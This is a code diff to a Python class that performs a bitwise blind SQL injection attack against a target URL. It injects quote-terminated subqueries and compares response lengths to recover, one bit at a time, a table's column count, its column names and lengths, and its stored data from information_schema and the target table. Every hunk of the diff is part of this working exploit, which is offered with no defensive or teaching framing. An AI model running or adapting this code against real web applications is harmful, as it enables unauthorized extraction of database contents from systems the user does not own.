@@ -20,12 +20,12 @@ class GetTableDataClass:
         number_bin_list = []
         for shift_idx in range(7, -1, -1):
             # Need know DB name
-            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
+            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                       bitwise_public.DATA_COUNT_SHIFT_QUERY.format(
                                                           """select count(*) from information_schema.columns
                                                           where table_name = '{0}'""".format(bitwise_public.TABLE_NAME),
                                                           shift_idx))).text)
-            number_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+            number_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
         self.column_number = bitwise_public.parsing_bin_list_to_decimal(number_bin_list)
         print(self.column_number)
@@ -34,7 +34,7 @@ class GetTableDataClass:
         for column_idx in range(self.column_number):
             column_length_bin_list = []
             for shift_idx in range(7, -1, -1):
-                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
+                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                           bitwise_public.DATA_LENGTH_SHIFT_QUERY.format("""select 
                                                           column_name from information_schema.columns where 
                                                           table_name = '{0}' limit {1},1""".format(
@@ -42,7 +42,7 @@ class GetTableDataClass:
                                                               column_idx),
                                                               shift_idx)))
                                  .text)
-                column_length_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+                column_length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
             self.column_name_length.append(bitwise_public.parsing_bin_list_to_decimal(column_length_bin_list))
 
@@ -54,7 +54,7 @@ class GetTableDataClass:
             for column_name_idx in range(self.column_name_length[column_idx]):
                 column_name_char_bin_list = []
                 for shift_idx in range(7, -1, -1):
-                    res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
+                    res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                               bitwise_public.DATA_BIT_SHIFT_QUERY.format("""select 
                                                               COLUMN_NAME from information_schema.columns 
                                                               where table_name = '{0}'
@@ -63,7 +63,7 @@ class GetTableDataClass:
                                                                                                          shift_idx,
                                                                                                          column_idx)))
                                      .text)
-                    column_name_char_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+                    column_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
                 column_char_list.append(bitwise_public.parsing_bin_list_to_char(column_name_char_bin_list))
 
@@ -73,13 +73,13 @@ class GetTableDataClass:
     def get_data_length(self, column_name):
         length_bin_list = []
         for shift_idx in range(7, -1, -1):
-            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
+            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                       bitwise_public.DATA_LENGTH_SHIFT_QUERY.format("""
                                                           select {0} from {1} limit 0,1
                                                       """.format(column_name, bitwise_public.TABLE_NAME),
                                                                                                     shift_idx)))
                              .text)
-            length_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+            length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
         return bitwise_public.parsing_bin_list_to_decimal(length_bin_list)
 
@@ -89,14 +89,14 @@ class GetTableDataClass:
         for data_idx in range(data_length):
             data_char_bin_list = []
             for shift_idx in range(7, -1, -1):
-                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\' and select ' +
+                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
                                                           bitwise_public.DATA_BIT_SHIFT_QUERY.format(
                                                               """select {0} from {1} limit 0,1""".format(column_name,
                                                                                                          bitwise_public.TABLE_NAME),
                                                               data_idx + 1,
                                                               shift_idx,
                                                               0))).text)
-                data_char_bin_list.append(int(res_length == self.SUCCESS_LENGTH))
+                data_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
             data_char_list.append(bitwise_public.parsing_bin_list_to_char(data_char_bin_list))
 
